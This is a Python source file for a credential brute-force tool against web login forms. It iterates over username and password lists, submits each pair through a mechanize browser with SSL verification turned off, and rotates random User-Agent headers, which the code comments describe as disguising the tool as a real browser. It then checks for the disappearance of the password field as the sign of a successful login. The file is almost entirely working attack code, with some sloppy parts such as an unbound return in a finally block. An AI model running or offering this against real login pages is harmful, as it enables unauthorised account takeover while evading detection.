import time
import requests
from lxml import html
from scipy import rand
import mechanize
import ssl


def brute(parameters):
    '''
    tries all option for usernames and passwords on the login page 
    '''
    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'action' : parameters['action'],
               }
    # if userlist is provided then checks if passwordlist is provided or just 1 password
    if parameters['user_list']:
        for user in parameters['user_list']:
            content['username'] = user
            if parameters['password_list']:
                for password in parameters['password_list']:
                    content['password'] = password
                    attack(content)
            else:
                content['password'] = parameters['password']
                attack(content)
    # if 1 username is provided then checks if passwordlist is provided or just 1 password 
    elif parameters['password_list']:
        content['username'] = parameters['username']
        for password in parameters['password_list']:
            content['password'] = password
            attack(content)

    else:
        content['username'] = parameters['username']
        content['password'] = parameters['password']
        attack(content)


def attack(content):
    '''
    
    '''
    user = str(content['username'])[2:-1]
    pwd = str(content['password'])[2:-1]
    
    br = mechanize.Browser()
    br.set_handle_robots(False)
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        # Legacy Python that doesn't verify HTTPS certificates by default
        pass
    else:
        # Handle target environment that doesn't support HTTPS verification
        ssl._create_default_https_context = _create_unverified_https_context
    url = content['url']
    #build packet headers in order to disguise mechanize as an actual browser
    headers = [('User-Agent', get_random_user_agent().encode().decode('utf-8')),
               ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
                    ('Accept-Language', 'en-gb,en;q=0.5'),
                    ('Accept-Encoding', 'gzip,deflate'),
                    ('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'),
                    ('Keep-Alive', '115'),
                    ('Connection', 'keep-alive'),
                    ('Cache-Control', 'max-age=0'),
                    ('Referer', url)]
    br.addheaders=headers

    print('[+][attack] trying' +' username:' + user+' password:'+pwd)
    
    #open mechanize browser
    br.open(url)
    
    #find the login form in order to fill in fields 
    for form in br.forms():
        if form.attrs['action'] == content['action']:
            br.form = form
            break
    # fill in username and password fields
    br[content['user_param']] = content['username']
    br[content['password_param']] = content['password']
    res = br.submit() # submit credentials 
    if check_login(res, content['password_param'], content['user_param']):
        print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
        exit(0)


def get_random_user_agent():
    '''generate random user agent to fill in the packet header'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15] 
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay 
    
    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]

def check_login(content, password_param, user_param):
    '''
    checks if login was successful by checking if status code is 200 and if the password field that 
    is contained in the login form is no longer found in the page source
    '''
    read = str(content.read())
    doc = html.document_fromstring(read)
    element = doc.xpath('//input[@type="password"]')
    
    for field in element:
     if field.get('name') == password_param:
         return False

    if content.code != 200:
        print(content.code)
        return False
    else:
        return True
